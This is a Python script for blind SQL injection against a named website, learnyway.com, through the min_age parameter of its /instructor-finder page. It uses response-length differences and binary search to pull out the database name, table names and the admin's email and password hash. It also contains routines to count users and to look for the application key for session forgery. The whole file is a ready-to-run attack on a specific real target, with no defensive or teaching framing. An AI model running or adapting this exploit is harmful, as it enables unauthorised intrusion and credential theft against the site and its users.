"""
LEARNYWAY.COM - SQLi EXPLOITATION
==================================

CONFIRMED VULNERABILITY:
- Endpoint: /instructor-finder
- Parameter: min_age
- TRUE (1 AND 1=1): 138,915 bytes
- FALSE (1 AND 1=2): 71,909 bytes
- REQUIRES: Valid User-Agent header!

Target: https://learnyway.com
"""

import requests
import time
import sys

BASE_URL = "https://learnyway.com"

# CRITICAL: Must include valid User-Agent!
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
}

session = requests.Session()
session.headers.update(HEADERS)
session.timeout = 30

def verify_sqli():
    """Verify SQLi vulnerability"""
    print("\n" + "="*60)
    print("    STEP 1: VERIFY SQLi")
    print("="*60)
    
    url = f"{BASE_URL}/instructor-finder"
    
    # TRUE condition
    r_true = session.get(url, params={"min_age": "1 AND 1=1"})
    true_len = len(r_true.text)
    
    # FALSE condition
    r_false = session.get(url, params={"min_age": "1 AND 1=2"})
    false_len = len(r_false.text)
    
    diff = true_len - false_len
    
    print(f"[*] TRUE condition (1 AND 1=1): {true_len} bytes")
    print(f"[*] FALSE condition (1 AND 1=2): {false_len} bytes")
    print(f"[*] Difference: {diff} bytes")
    
    if diff > 10000:
        print(f"\n[!!!] SQLi CONFIRMED! Difference > 10KB")
        return true_len, false_len
    else:
        print(f"\n[-] SQLi not detected or different threshold")
        return None, None

def binary_search_extract(query, true_threshold, false_threshold):
    """
    Extract data character by character using binary search
    """
    result = ""
    url = f"{BASE_URL}/instructor-finder"
    
    for position in range(1, 100):
        low, high = 32, 126
        found = False
        
        while low <= high:
            mid = (low + high) // 2
            
            # Payload: Check if ASCII value of char at position > mid
            payload = f"1 AND ASCII(SUBSTR(({query}),{position},1))>{mid}"
            
            try:
                r = session.get(url, params={"min_age": payload})
                response_len = len(r.text)
                
                # Determine TRUE or FALSE based on response length
                # Average threshold
                avg_threshold = (true_threshold + false_threshold) // 2
                
                if response_len > avg_threshold:
                    # TRUE - char is greater than mid
                    low = mid + 1
                else:
                    # FALSE - char is less than or equal to mid
                    high = mid - 1
                    
            except Exception as e:
                print(f"\n    Error: {e}")
                break
            
            time.sleep(0.3)  # Avoid rate limiting
        
        # Found character
        if 32 <= low <= 126:
            char = chr(low)
            if char in [' ', '\x00', '']:
                break
            result += char
            found = True
            print(f"\r    Extracting: {result}", end="", flush=True)
        else:
            break
    
    print()
    return result

def extract_database_name(true_threshold, false_threshold):
    """Extract current database name"""
    print("\n" + "="*60)
    print("    STEP 2: EXTRACT DATABASE NAME")
    print("="*60)
    
    query = "SELECT database()"
    db_name = binary_search_extract(query, true_threshold, false_threshold)
    
    print(f"\n[+] Database Name: {db_name}")
    return db_name

def extract_table_names(true_threshold, false_threshold, db_name, limit=5):
    """Extract table names from database"""
    print("\n" + "="*60)
    print("    STEP 3: EXTRACT TABLE NAMES")
    print("="*60)
    
    tables = []
    
    for i in range(limit):
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i},1"
        table_name = binary_search_extract(query, true_threshold, false_threshold)
        
        if table_name:
            tables.append(table_name)
            print(f"    [+] Table {i+1}: {table_name}")
        else:
            break
    
    return tables

def extract_admin_credentials(true_threshold, false_threshold):
    """Extract admin email and password hash"""
    print("\n" + "="*60)
    print("    STEP 4: EXTRACT ADMIN CREDENTIALS")
    print("="*60)
    
    # Extract admin email (ID=1)
    print("\n[*] Extracting admin email...")
    email_query = "SELECT email FROM users WHERE id=1"
    admin_email = binary_search_extract(email_query, true_threshold, false_threshold)
    print(f"\n[+] Admin Email: {admin_email}")
    
    # Extract admin password hash
    print("\n[*] Extracting admin password hash...")
    pass_query = "SELECT password FROM users WHERE id=1"
    admin_pass = binary_search_extract(pass_query, true_threshold, false_threshold)
    print(f"\n[+] Admin Password Hash: {admin_pass[:60]}...")
    
    return admin_email, admin_pass

def extract_app_key(true_threshold, false_threshold):
    """Try to extract APP_KEY from settings table"""
    print("\n" + "="*60)
    print("    STEP 5: EXTRACT APP KEY (for session forge)")
    print("="*60)
    
    # Common settings table queries
    queries = [
        "SELECT value FROM settings WHERE name='app_key' LIMIT 1",
        "SELECT option_value FROM options WHERE option_name='app_key' LIMIT 1",
    ]
    
    for query in queries:
        result = binary_search_extract(query, true_threshold, false_threshold)
        if result and "base64:" in result.lower():
            print(f"\n[+] APP_KEY Found: {result}")
            return result
    
    print("\n[-] APP_KEY not found in common tables")
    return None

def count_users(true_threshold, false_threshold):
    """Count total users in database"""
    print("\n" + "="*60)
    print("    COUNTING USERS")
    print("="*60)
    
    url = f"{BASE_URL}/instructor-finder"
    
    for count in range(1, 100):
        payload = f"1 AND (SELECT COUNT(*) FROM users)={count}"
        r = session.get(url, params={"min_age": payload})
        
        avg_threshold = (true_threshold + false_threshold) // 2
        
        if len(r.text) > avg_threshold:
            print(f"[+] Total users: {count}")
            return count
        
        time.sleep(0.2)
    
    return None

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       LEARNYWAY.COM - SQL INJECTION EXPLOITATION             ║
║       With Valid User-Agent Header                           ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Step 1: Verify SQLi
    true_len, false_len = verify_sqli()
    
    if true_len is None:
        print("\n[-] SQLi verification failed. Exiting.")
        sys.exit(1)
    
    # Step 2: Extract database name
    db_name = extract_database_name(true_len, false_len)
    
    # Step 3: Extract tables (first 5)
    if db_name:
        tables = extract_table_names(true_len, false_len, db_name, limit=5)
    
    # Step 4: Extract admin credentials
    admin_email, admin_pass = extract_admin_credentials(true_len, false_len)
    
    # Summary
    print("\n" + "="*60)
    print("    EXPLOITATION SUMMARY")
    print("="*60)
    print(f"""
    [+] Target: {BASE_URL}
    [+] Database: {db_name}
    [+] Admin Email: {admin_email}
    [+] Admin Hash: {admin_pass[:30] if admin_pass else 'N/A'}...
    """)

if __name__ == "__main__":
    main()
